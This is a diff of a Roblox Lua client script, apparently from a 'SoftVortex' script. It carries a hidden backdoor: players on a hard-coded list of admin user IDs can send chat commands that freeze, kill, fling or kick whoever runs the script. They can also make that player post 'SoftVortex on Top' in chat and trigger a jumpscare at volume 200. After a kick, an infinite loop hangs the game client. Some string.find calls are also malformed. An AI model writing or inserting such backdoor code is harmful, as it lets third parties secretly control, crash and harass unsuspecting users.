@@ -1,59 +1,116 @@
-local whitelist = { owner = {2200043156}, admin = {3096947136},}
+local player = game.Players.LocalPlayer
 
-        owner = true admin = true
-    
-        local function runcommand(message,author) owner = false admin = false local player = game.Players[author] for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true end
-    end for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true end
-    end
-    
-        if admin or owner then
-        if message:sub(1, 6) == ":bring" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
+local Players = game:GetService("Players")
+
+local Admins = {
+    2200043156, --Airsoft
+}
+local function commands(msg, plr)
+    if table.find(Admins, plr) then
+        local Mod = game:GetService("Players"):GetPlayerByUserId(plr)
+        local Msg = string.lower(msg)
+        local SplitCMD = string.split(Msg, " ")
+        local Lower = string.lower(player.Name)
+        local Allowed = string.find(Lower, SplitCMD[2])
+        if Allowed then
+            if string.find(SplitCMD[1], ":freeze") then
+                player.Character.HumanoidRootPart.Anchored = true
             end
-        end
-        -- kill start
-        if message:sub(1, 5) == ":kill" then
-            if message:match(game.Players.LocalPlayer.Name) then
+            if string.find(SplitCMD[1], ":freeze .","all") then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            if string.find(SplitCMD[1], ":unfreeze") then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+            if string.find(SplitCMD[1], ":unfreeze .","all") then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+            if string.find(SplitCMD[1], ":users") then
+             local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+            path:FireServer("SoftVortex on Top","all")
+            end
+            if string.find(SplitCMD[1], ":fling") then
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+            if string.find(SplitCMD[1], ":kill") then
                 local plr = game.Players.LocalPlayer
                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
             end
-        end
-        if message == ":users" then
-            if author ~= game.Players.LocalPlayer.Name then
-                local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
-                path:FireServer("SoftVortex ON TOP"..author.."!","all")
-            end
-        end
-        end
-        --  kill end
-        -- kick start
-        if message:sub(1, 5) == ":kick" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer:Kick("\nlol u were kicked by?. \n["..author.."]")
-    
-            end
-        end
-        if message:sub(1, 9) == ":unfreeze" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                game.Players.LocalPlayer.Character.Head.Anchored = false
-            end
-        end
-        if message:sub(1, 6) == ":fling" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
-            end
-        end
-end
-    for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.admin) do if v.UserId == _ then admin = true if admin then warn('New admin : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
-    end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true if admin then warn('New admin : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
-    end)
-    
-    -- // Owner
-    
-    for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.owner) do if v.UserId == _ then owner = true if owner then warn('New owner : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
-    end 
+            if string.find(SplitCMD[1], ":scare") then
+                function Scare()
+                    local ScreenGui = Instance.new("ScreenGui")
+                    local ImageLabel = Instance.new("ImageLabel")
 
+                    local image = {"109129888", "146577131", "1309130490", "1119705746", "7479500080"}
+
+                    local image2 = {"7236404523", "6150329916", "8195739170", "8628815817"}
+
+                    ScreenGui.Parent = game.CoreGui
+                    ScreenGui.Name = "SCREAM"
+                    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+                    ImageLabel.Parent = ScreenGui
+                    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    ImageLabel.Position = UDim2.new(0, 0, -0.000674206764, 0)
+                    ImageLabel.Size = UDim2.new(1, 0, 1.00857365, 0)
+                    ImageLabel.Image = "rbxassetid://" .. image[math.random(1, #image)]
+                    ImageLabel.Visible = false
+                    ImageLabel.BackgroundTransparency = 1
+                    ImageLabel.Visible = true
+                    local sound = Instance.new("Sound")
+                    sound.Parent = game.Workspace
+                    sound.SoundId = "rbxassetid://" .. image2[math.random(1, #image2)]
+                    sound.Volume = 200
+                    sound:Play()
+                    for i = 0, 1, 0.1 do
+                        wait(0.05)
+                        ImageLabel.ImageTransparency = i
+                    end
+                    sound.Ended:Wait()
+                    sound:Destroy()
+                    ScreenGui:Destroy()
+                end
+                if not game.CoreGui:FindFirstChild("SCREAM") then
+                    Scare()
+                end
+            end
+            if string.find(SplitCMD[1], ":kick") then
+                local ISADMIN = table.find(Admins, player.UserId)
+                if not ISADMIN then
+                    player:Kick("Kicked.")
+                    wait(5)
+                    while true do
+                    end
+                end
+            end
+        else
+            if string.find(msg, "/e users") then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SoftVortex on Top", "All")
+            end
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(
+    function(plr)
+        local ADMINS = table.find(Admins, plr.UserId)
+        if ADMINS then
+            plr.Chatted:Connect(
+                function(msg)
+                    commands(msg, plr.UserId)
+                end
+            )
+        end
+    end
+)
+
+for i, v in pairs(game:GetService("Players"):GetChildren()) do
+    local ADMINS = table.find(Admins, v.UserId)
+    if ADMINS then
+        v.Chatted:Connect(
+            function(msg)
+                commands(msg, v.UserId)
+            end
+        )
+    end
+end
